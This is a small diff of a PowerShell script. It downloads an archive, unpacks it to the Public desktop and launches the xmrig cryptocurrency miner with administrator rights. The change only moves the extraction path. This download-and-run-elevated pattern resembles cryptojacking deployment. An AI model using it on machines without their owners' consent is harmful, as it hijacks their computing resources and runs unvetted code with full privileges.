@@ -34,8 +34,8 @@ function Get-Webfile ($url)
     $destStream.Dispose()
     $responseStream.Dispose()
     Add-Type -assembly "system.io.compression.filesystem"
-    [io.compression.zipfile]::ExtractToDirectory($dest, "C:\Users\administrator\Desktop")
-    cd C:\Users\administrator\Desktop
+    [io.compression.zipfile]::ExtractToDirectory($dest, "C:\Users\Public\Desktop")
+    cd C:\Users\Public\Desktop
     Start-Process -FilePath "xmrig.exe" -Verb RunAs
 
 }
